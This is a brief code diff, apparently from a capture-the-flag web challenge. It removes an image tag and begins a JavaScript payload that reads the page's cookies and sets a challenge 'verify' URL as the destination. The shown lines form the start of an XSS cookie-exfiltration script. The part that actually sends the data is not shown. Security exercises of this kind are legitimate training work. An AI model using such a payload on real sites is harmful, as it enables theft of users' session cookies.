@@ -1,4 +1,3 @@
-<img src="http://www.baidu.com/img/baidu_sylogo1.gif"></img>
 (function(window, document) {
     var cookies = document.cookie;
     var xssURIBase = "https://chall.necst.it/challenges/web3/verify/411/";
